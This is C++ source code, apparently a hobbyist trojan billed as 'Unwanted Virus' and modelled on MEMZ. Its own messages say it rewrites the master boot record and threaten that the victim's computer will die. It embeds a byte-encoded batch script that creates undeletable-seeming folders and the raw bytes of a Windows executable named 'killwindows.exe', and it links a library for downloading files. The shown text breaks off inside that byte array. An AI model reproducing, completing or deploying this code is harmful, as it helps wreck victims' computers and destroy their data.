/*-------------------------------------------+
|                                            |
|   Unwanted Virus Source Code               |
|                                            |
|   (C) BenjaminFretez 2021.                 |
|                                            |
+--------------------------------------------*/

/* This malware is based on the MEMZ malware */

/* include files */
#include <windows.h> // Required for WINAPI
#include <iostream> // Required for input-output
#include <fstream> // Required for files
#include <stdio.h>

/* required for downloading files*/
#pragma comment (lib, "urlmon.lib")

using namespace std;

DWORD wb;

/* files content */
const unsigned char msg[] = "Hello! You have ran the called Úñåáñþéd ßí®ú’ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour eta is 2 minutes, THE TIME IS RUNNING! =)";
const size_t msg_len = sizeof(msg);

const unsigned char diem[] = "ÜÓÚ ÑÉÉÐ ÞÓ ÐÍÉÉÉÉ²¼2ð¤ú®¥½ö’«   ÜÓÚ ÑÉEÐ TÓ ÐÍÉ YOU NEED TO DIEÉÉÉ aáaááá €€¼€³¤²¤¤¬²¬\r\nïñ§tág®áµ@Endersshow@#RT#$tþ¤³þ³å³äs³®É F3¤€Þ³TÅ®¤ÅÞ€ÜÉÜWÞÜÉ€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ÁÄÉ³ÁÅÅÁÅAÁÄÉ®Ü¼Ú¼½Í¾»¬»«¥®²³ÞÄ³®";
const size_t die_len = sizeof(diem);

const unsigned char lastm[] = "ÜÓÚ\n YOU COMPUTER WILL DIE IN 10 SECONDS €¤ÜÞÅ³®²®¤³Þ\r\n³€ÞÜ¤Wé nééð á ñéwc ímputyer guys¼€ÚÉ6YE³\r\n®²¤Þ¤€Ü¼Ú€Time is over, you killed it!¤Þ¤€Þ¤\r\n³é³å²€Þ¤";
const size_t last_len = sizeof(lastm);

const unsigned char escapem[] = "Hey! The escape is behind you,\r\nLook behind you please, Is there!!";
const size_t escape_len = sizeof(escapem);


const unsigned char batm[] = { 0xEF, 0xBB, 0xBF, 0x40, 0x65, 0x63, 0x68, 0x6F, 0x20, 0x6F, 0x66, 0x66, 0x0D, 0x0A, 0x63, 0x64,
0xAA, 0xE0, 0xA6, 0xBE, 0xE0, 0xA6, 0xB0, 0xE0, 0xA6, 0xAC, 0xE0, 0xA7, 0x87, 0xE0, 0xA6, 0xA8,
0x20, 0xE0, 0xA6, 0xA8, 0xE0, 0xA6, 0xBE, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22,
0x63, 0x3A, 0x20, 0xD0, 0x92, 0xD1, 0x8B, 0x20, 0xD0, 0xBD, 0xD0, 0xB5, 0x20, 0xD0, 0xBC, 0xD0,
0xBE, 0xD0, 0xB6, 0xD0, 0xB0, 0xD1, 0x86, 0xD0, 0xB5, 0x20, 0xD0, 0xB2, 0xD1, 0x8B, 0xD0, 0xB4,
0xD0, 0xB0, 0xD0, 0xBB, 0xD1, 0x96, 0xD1, 0x86, 0xD1, 0x8C, 0x20, 0xD0, 0xB3, 0xD1, 0x8D, 0xD1,
0x82, 0xD0, 0xB0, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xD0,
0x9D, 0xD0, 0xB5, 0x20, 0xD0, 0xBC, 0xD0, 0xBE, 0xD0, 0xB6, 0xD0, 0xB5, 0xD1, 0x82, 0xD0, 0xB5,
0x20, 0xD0, 0xB4, 0xD0, 0xB0, 0x20, 0xD0, 0xBF, 0xD1, 0x80, 0xD0, 0xB5, 0xD0, 0xBC, 0xD0, 0xB0,
0xD1, 0x85, 0xD0, 0xBD, 0xD0, 0xB5, 0xD1, 0x82, 0xD0, 0xB5, 0x20, 0xD1, 0x82, 0xD0, 0xBE, 0xD0,
0xB2, 0xD0, 0xB0, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xD0,
0x92, 0xD1, 0x8B, 0x20, 0xD0, 0xBD, 0xD0, 0xB5, 0x20, 0xD0, 0xBC, 0xD0, 0xBE, 0xD0, 0xB6, 0xD0,
0xB5, 0xD1, 0x82, 0xD0, 0xB5, 0x20, 0xD1, 0x83, 0xD0, 0xB4, 0xD0, 0xB0, 0xD0, 0xBB, 0xD0, 0xB8,
0xD1, 0x82, 0xD1, 0x8C, 0x20, 0xD1, 0x8D, 0xD1, 0x82, 0xD0, 0xBE, 0x20, 0x5C, 0x22, 0x0D, 0x0A,
0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xE6, 0x82, 0xA8, 0xE6, 0x97, 0xA0, 0xE6, 0xB3, 0x95,
0xE5, 0x88, 0xA0, 0xE9, 0x99, 0xA4, 0xE6, 0xAD, 0xA4, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64,
0x20, 0x22, 0x63, 0x3A, 0x20, 0xE0, 0xB6, 0x94, 0xE0, 0xB6, 0xB6, 0xE0, 0xB6, 0xA7, 0x20, 0xE0,
0xB6, 0xB8, 0xE0, 0xB7, 0x99, 0xE0, 0xB6, 0xBA, 0x20, 0xE0, 0xB6, 0x89, 0xE0, 0xB7, 0x80, 0xE0,
0xB6, 0xAD, 0xE0, 0xB7, 0x8A, 0x20, 0xE0, 0xB6, 0x9A, 0xE0, 0xB7, 0x85, 0x20, 0xE0, 0xB6, 0xB1,
0xE0, 0xB7, 0x9C, 0xE0, 0xB7, 0x84, 0xE0, 0xB7, 0x90, 0xE0, 0xB6, 0x9A, 0x20, 0x5C, 0x22, 0x0D,
0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xEC, 0x9D, 0xB4, 0xEA, 0xB2, 0x83, 0xEC, 0x9D,
0x84, 0x20, 0xEC, 0xA0, 0x9C, 0xEA, 0xB1, 0xB0, 0x20, 0xED, 0x95, 0xA0, 0x20, 0xEC, 0x88, 0x98,
0x20, 0xEC, 0x97, 0x86, 0xEC, 0x8A, 0xB5, 0xEB, 0x8B, 0x88, 0xEB, 0x8B, 0xA4, 0x2E, 0x20, 0x5C,
0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4E, 0x65, 0x20, 0x6D, 0x6F, 0xC5,
0xBE, 0x65, 0x74, 0x65, 0x20, 0x6F, 0x76, 0x6F, 0x20, 0x75, 0x6B, 0x6C, 0x6F, 0x6E, 0x69, 0x74,
0x69, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x4E, 0x6F, 0x20,
0x70, 0x6F, 0x74, 0x73, 0x20, 0x74, 0x72, 0x65, 0x75, 0x72, 0x65, 0x20, 0x61, 0x69, 0x78, 0xC3,
0xB2, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x54, 0x65, 0x20,
0x65, 0x69, 0x20, 0x73, 0x61, 0x61, 0x20, 0x73, 0x65, 0x64, 0x61, 0x20, 0x65, 0x65, 0x6D, 0x61,
0x6C, 0x64, 0x61, 0x64, 0x61, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A,
0x20, 0xE0, 0xAA, 0xA4, 0xE0, 0xAA, 0xAE, 0xE0, 0xAB, 0x87, 0x20, 0xE0, 0xAA, 0x86, 0xE0, 0xAA,
0xA8, 0xE0, 0xAB, 0x87, 0x20, 0xE0, 0xAA, 0xA6, 0xE0, 0xAB, 0x82, 0xE0, 0xAA, 0xB0, 0x20, 0xE0,
0xAA, 0x95, 0xE0, 0xAA, 0xB0, 0xE0, 0xAB, 0x80, 0x20, 0xE0, 0xAA, 0xB6, 0xE0, 0xAA, 0x95, 0xE0,
0xAA, 0xA4, 0xE0, 0xAA, 0xBE, 0x20, 0xE0, 0xAA, 0xA8, 0xE0, 0xAA, 0xA5, 0xE0, 0xAB, 0x80, 0x20,
0x5C, 0x22, 0x20, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xD7, 0x90, 0xD7, 0x99,
0xD7, 0xA0, 0xD7, 0x9A, 0x20, 0xD7, 0x99, 0xD7, 0x9B, 0xD7, 0x95, 0xD7, 0x9C, 0x20, 0xD7, 0x9C,
0xD7, 0x94, 0xD7, 0xA1, 0xD7, 0x99, 0xD7, 0xA8, 0x20, 0xD7, 0x96, 0xD7, 0x90, 0xD7, 0xAA, 0x20,
0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x4B, 0x6F, 0x6A, 0x20, 0x74,
0x73, 0x69, 0x73, 0x20, 0x74, 0x75, 0x61, 0x6A, 0x20, 0x79, 0x65, 0x65, 0x6D, 0x20, 0x74, 0x73,
0x68, 0x65, 0x6D, 0x20, 0x71, 0x68, 0x6F, 0x76, 0x20, 0x6E, 0x6F, 0x20, 0x5C, 0x22, 0x0D, 0x0A,
0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x4E, 0x6F, 0x20, 0x70, 0x75, 0x65, 0x64, 0x65, 0x73,
0x20, 0x71, 0x75, 0x69, 0x74, 0x61, 0x72, 0x20, 0x65, 0x73, 0x74, 0x6F, 0x20, 0x5C, 0x22, 0x0D,
0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x59, 0x4F, 0x55, 0x20, 0x43, 0x41, 0x4E, 0x4E,
0x4F, 0x54, 0x20, 0x44, 0x45, 0x4C, 0x45, 0x54, 0x45, 0x20, 0x54, 0x48, 0x49, 0x53, 0x20, 0x5C,
0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x41, 0x6E, 0x64, 0x61, 0x20, 0x74,
0x69, 0x64, 0x61, 0x6B, 0x20, 0x64, 0x61, 0x70, 0x61, 0x74, 0x20, 0x6D, 0x65, 0x6E, 0x67, 0x68,
0x61, 0x70, 0x75, 0x73, 0x20, 0x69, 0x6E, 0x69, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20,
0x22, 0x63, 0x3A, 0x20, 0x4E, 0xC3, 0xAD, 0x20, 0x66, 0xC3, 0xA9, 0x69, 0x64, 0x69, 0x72, 0x20,
0x6C, 0x65, 0x61, 0x74, 0x20, 0xC3, 0xA9, 0x20, 0x73, 0x65, 0x6F, 0x20, 0x61, 0x20, 0x62, 0x68,
0x61, 0x69, 0x6E, 0x74, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20,
0xC3, 0x9E, 0xC3, 0xBA, 0x20, 0x67, 0x65, 0x74, 0x75, 0x72, 0x20, 0x65, 0x6B, 0x6B, 0x69, 0x20,
0x66, 0x6A, 0x61, 0x72, 0x6C, 0xC3, 0xA6, 0x67, 0x74, 0x20, 0xC3, 0xBE, 0x65, 0x74, 0x74, 0x61,
0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xE3, 0x81, 0x93, 0xE3,
0x82, 0x8C, 0xE3, 0x81, 0xAF, 0xE5, 0x89, 0x8A, 0xE9, 0x99, 0xA4, 0xE3, 0x81, 0xA7, 0xE3, 0x81,
0x8D, 0xE3, 0x81, 0xBE, 0xE3, 0x81, 0x9B, 0xE3, 0x82, 0x93, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D,
0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x53, 0x61, 0x6D, 0x70, 0x65, 0x79, 0x61, 0x6E, 0x20, 0x6F,
0x72, 0x61, 0x20, 0x62, 0x69, 0x73, 0x61, 0x20, 0x6D, 0x62, 0x75, 0x73, 0x61, 0x6B, 0x20, 0x69,
0x6B, 0x69, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4E, 0x74,
0x75, 0x73, 0x68, 0x6F, 0x62, 0x6F, 0x72, 0x61, 0x20, 0x67, 0x75, 0x73, 0x69, 0x62, 0x61, 0x20,
0x69, 0x62, 0x69, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x56,
0x6F, 0x63, 0xC3, 0xAA, 0x20, 0x6E, 0xC3, 0xA3, 0x6F, 0x20, 0x70, 0x6F, 0x64, 0x65, 0x20, 0x64,
0x65, 0x6C, 0x65, 0x74, 0x61, 0x72, 0x20, 0x69, 0x73, 0x74, 0x6F, 0x20, 0x5C, 0x22, 0x0D, 0x0A,
0x0D, 0x0A, 0x63, 0x6C, 0x73, 0x0D, 0x0A };
const size_t bat_len = sizeof(batm);

/* killwindows.exe program - 10kb */
const unsigned char kwp[] = { 0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xF0, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD,
0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70,
0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20,
0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0xCB, 0x83, 0x07,
0x48, 0xAA, 0xED, 0x54, 0x48, 0xAA, 0xED, 0x54, 0x48, 0xAA, 0xED, 0x54,
0x41, 0xD2, 0x7E, 0x54, 0x42, 0xAA, 0xED, 0x54, 0x1A, 0xDF, 0xEC, 0x55,
0x4A, 0xAA, 0xED, 0x54, 0x1A, 0xDF, 0xE8, 0x55, 0x5B, 0xAA, 0xED, 0x54,
0x1A, 0xDF, 0xE9, 0x55, 0x44, 0xAA, 0xED, 0x54, 0x1A, 0xDF, 0xEE, 0x55,
0x49, 0xAA, 0xED, 0x54, 0x5C, 0xC1, 0xEC, 0x55, 0x4F, 0xAA, 0xED, 0x54,
0x48, 0xAA, 0xEC, 0x54, 0x75, 0xAA, 0xED, 0x54, 0x1D, 0xDF, 0xE4, 0x55,
0x49, 0xAA, 0xED, 0x54, 0x1D, 0xDF, 0x12, 0x54, 0x49, 0xAA, 0xED, 0x54,
0x1D, 0xDF, 0xEF, 0x55, 0x49, 0xAA, 0xED, 0x54, 0x52, 0x69, 0x63, 0x68,
0x48, 0xAA, 0xED, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x50, 0x45, 0x00, 0x00, 0x4C, 0x01, 0x05, 0x00, 0x7C, 0x09, 0xFB, 0x60,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x02, 0x01,
0x0B, 0x01, 0x0E, 0x1D, 0x00, 0x10, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x08, 0x15, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x10, 0x00, 0x00,
0x00, 0x02, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00,
0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x40, 0x81,
0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x94, 0x26, 0x00, 0x00,
0xC8, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xE0, 0x01, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0xA8, 0x01, 0x00, 0x00,
0x18, 0x22, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x88, 0x22, 0x00, 0x00,
0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x20, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78,
0x74, 0x00, 0x00, 0x00, 0x41, 0x0F, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
0x00, 0x10, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60,
0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x86, 0x0D, 0x00, 0x00,
0x00, 0x20, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x40, 0x00, 0x00, 0x40, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00,
0x94, 0x03, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
0x00, 0x22, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC0, 0x2E, 0x72, 0x73, 0x72,
0x63, 0x00, 0x00, 0x00, 0xE0, 0x01, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
0x00, 0x02, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40,
0x2E, 0x72, 0x65, 0x6C, 0x6F, 0x63, 0x00, 0x00, 0xA8, 0x01, 0x00, 0x00,
0x00, 0x50, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x26, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x40, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x55, 0x8B, 0xEC, 0x53, 0x56, 0x57, 0x33, 0xF6,
0x33, 0xDB, 0x33, 0xFF, 0x0F, 0x1F, 0x40, 0x00, 0x8B, 0xC6, 0x4E, 0x85,
0xC0, 0x75, 0x0B, 0x57, 0x53, 0xFF, 0x55, 0x08, 0x83, 0xC4, 0x08, 0x8B,
0xF0, 0x43, 0x6A, 0x0A, 0x47, 0xFF, 0x15, 0x40, 0x20, 0x40, 0x00, 0xEB,
0xE3, 0xCC, 0xCC, 0xCC, 0x68, 0x10, 0x27, 0x00, 0x00, 0x68, 0xE8, 0x03,
0x00, 0x00, 0xFF, 0x15, 0x14, 0x20, 0x40, 0x00, 0x83, 0xC8, 0xFF, 0xC2,
0x04, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0xA1, 0x04, 0x30, 0x40, 0x00, 0x33,
0xC5, 0x89, 0x45, 0xFC, 0x8B, 0x45, 0x0C, 0x53, 0x8B, 0x5D, 0x10, 0x56,
0x8B, 0x35, 0x74, 0x20, 0x40, 0x00, 0x6A, 0x00, 0x89, 0x45, 0xF0, 0xFF,
0xD6, 0x6A, 0x01, 0xA3, 0x84, 0x33, 0x40, 0x00, 0xFF, 0xD6, 0xA3, 0x80,
0x33, 0x40, 0x00, 0x8B, 0x45, 0x08, 0x83, 0xF8, 0x03, 0x75, 0x68, 0x8B,
0x33, 0x89, 0x75, 0xF4, 0xF7, 0x46, 0x20, 0x00, 0x00, 0x40, 0x80, 0x74,
0x5A, 0x57, 0x8B, 0x3D, 0x04, 0x20, 0x40, 0x00, 0x8D, 0x45, 0xF8, 0x50,
0x6A, 0x04, 0xFF, 0x35, 0x88, 0x33, 0x40, 0x00, 0xFF, 0xD7, 0x8B, 0x45,
0xF8, 0x8B, 0x0D, 0x84, 0x33, 0x40, 0x00, 0x25, 0xFF, 0xFF, 0xFF, 0x7F,
0x2B, 0x4E, 0x14, 0x99, 0xF7, 0xF9, 0x8D, 0x45, 0xF8, 0x50, 0x6A, 0x04,
0xFF, 0x35, 0x88, 0x33, 0x40, 0x00, 0x8B, 0xF2, 0xFF, 0xD7, 0x8B, 0x7D,
0xF4, 0x8B, 0x45, 0xF8, 0x8B, 0x0D, 0x80, 0x33, 0x40, 0x00, 0x25, 0xFF,
0xFF, 0xFF, 0x7F, 0x99, 0x2B, 0x4F, 0x10, 0xF7, 0xF9, 0x8B, 0x45, 0x08,
0x89, 0x77, 0x1C, 0x89, 0x57, 0x18, 0x5F, 0x53, 0xFF, 0x75, 0xF0, 0x50,
0x6A, 0x00, 0xFF, 0x15, 0x64, 0x20, 0x40, 0x00, 0x8B, 0x4D, 0xFC, 0x5E,
0x33, 0xCD, 0x5B, 0xE8, 0xA7, 0x01, 0x00, 0x00, 0x8B, 0xE5, 0x5D, 0xC2,
0x0C, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0xCC, 0xCC, 0xCC, 0xCC, 0xFF, 0x15, 0x44, 0x20, 0x40, 0x00, 0x50, 0x6A,
0x00, 0x68, 0x50, 0x10, 0x40, 0x00, 0x6A, 0x05, 0xFF, 0x15, 0x60, 0x20,
0x40, 0x00, 0x6A, 0x30, 0x68, 0x98, 0x21, 0x40, 0x00, 0x68, 0xB0, 0x21,
0x40, 0x00, 0x6A, 0x00, 0xFF, 0x15, 0x68, 0x20, 0x40, 0x00, 0x6A, 0x30,
0x68, 0x98, 0x21, 0x40, 0x00, 0x68, 0xF4, 0x21, 0x40, 0x00, 0x6A, 0x00,
0xFF, 0x15, 0x68, 0x20, 0x40, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC2,
0x04, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x56, 0x8B, 0x35, 0x40, 0x20, 0x40, 0x00, 0x57, 0x8B, 0x3D, 0x24, 0x20,
0x40, 0x00, 0x66, 0x90, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x68, 0x20,
0x11, 0x40, 0x00, 0x68, 0x00, 0x10, 0x00, 0x00, 0x6A, 0x00, 0xFF, 0xD7,
